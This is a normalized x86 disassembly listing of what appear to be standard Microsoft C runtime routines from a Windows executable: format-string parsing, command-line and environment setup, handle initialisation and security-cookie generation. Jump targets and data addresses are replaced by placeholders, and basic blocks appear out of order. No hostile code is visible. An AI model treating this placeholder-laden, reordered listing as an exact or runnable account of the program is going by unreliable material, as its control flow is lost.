movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x40c ] eax
test eax eax
jns r-xdata
movzx eax [ ebx ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ ebx + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ ebx + 0x2 ] 0x32
jne r-xdata
add ebx 0x4
or [ ebp - 0x408 ] 0x8000
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
cmp [ ebp - 0x40c ] 0xffffffff
mov ebx 0x7fffffff
je r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x40c ] edx
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi edx
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add ebx 0x4
and [ ebp - 0x408 ] 0xffff7fff
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add ebx esi
or [ ebp - 0x408 ] 0x1000
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x418 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx [ ebp - 0x40c ]
mov [ ebp - 0x420 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x10
je r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x454 ] 0x7
jmp r-xdata
sub eax esi
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] edx
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x454 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x438 ] ax
mov eax [ ebp - 0x454 ]
add eax 0x51
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] esi
jmp r-xdata
cmp [ ebp - 0x458 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea edi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x418 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x420 ] ecx
sub eax esi
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x458 ]
call sub_41a7eb
and [ ebp - 0x458 ] 0x0
pop ecx
mov ebx [ ebp - 0x430 ]
sub ebx [ ebp - 0x414 ]
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
mov [ ebp - 0x468 ] ebx
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax esi
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax esi
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x42c ]
mov ecx [ ebp - 0x424 ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x41c ]
call sub_421471
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp cx 0x67
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edx [ eax ]
add eax 0x8
mov esi [ DecodePointer@IAT ]
mov [ ebp - 0x418 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x470 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x40c ]
mov [ ebp - 0x474 ] edx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x474 ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
call sub_428646
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax esi
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_4287ce
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x41c ]
dec edi
call sub_421442
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
mov ebx 0xa3
cmp [ ebp - 0x40c ] ebx
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] edx
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x434 ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
mov [ ebp - 0x433 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_429b9e
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x43c ] 0x0
add eax esi
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x410 ]
mov edi [ ebp - 0x42c ]
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x41c ]
call sub_421471
pop ecx
cmp [ ebp - 0x414 ] 0x0
jle r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test edi edi
jg r-xdata
push 0x20
mov ecx [ ebp - 0x420 ]
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_41c229
pop ecx
mov ecx [ ebp - 0x420 ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x41c ]
mov [ esi ] eax
mov ax [ ebp - 0x41c ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x450 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov ebx [ ebp - 0x414 ]
mov eax [ ebp - 0x42c ]
push 0x30
lea esi [ ebp - 0x41c ]
dec edi
call sub_421442
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
mov [ ebp - 0x40c ] ebx
jmp r-xdata
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc edi
mov [ ebp - 0x410 ] edi
lea eax [ ebp - 0x44c ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x420 ]
cdq
push edx
push eax
push ebx
push edi
call sub_427060
add ecx 0x30
mov [ ebp - 0x468 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov edi [ ebp - 0x468 ]
jmp r-xdata
or [ ebp - 0x41c ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x42c ]
lea esi [ ebp - 0x41c ]
call sub_421442
add edi [ ebp - 0x420 ]
pop ecx
test ebx ebx
jg r-xdata
test edi edi
jg r-xdata
call sub_41d120
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x41c ] 0x0
jl r-xdata
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
dec ebx
call sub_429b9e
add esp 0x10
mov [ ebp - 0x420 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x42c ]
push 0x20
lea esi [ ebp - 0x41c ]
dec edi
call sub_421442
cmp [ ebp - 0x41c ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_422c62
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_41eba4
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_422cb2
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_423acb
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_429d21
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_422d11
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_423acb
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_41c26e
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_41d120
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_41d120
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_41a7eb
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_41c26e
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_41a7eb
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_41e063
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41ef83
int3
add edi 0x4
sub_422ded
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_429d21
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_429d21
pop ecx
test eax eax
je r-xdata
call sub_429d21
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_422f87
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_423acb
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_422ded
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_41c229
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_422ded
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_423042
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_41c229
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_41a7eb
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_4230d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_41c26e
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_41c26e
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_42331e
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_423344
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_42336a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_423405
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_423434
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_41adb0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_423498
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_423cbb
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_41bc4a
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
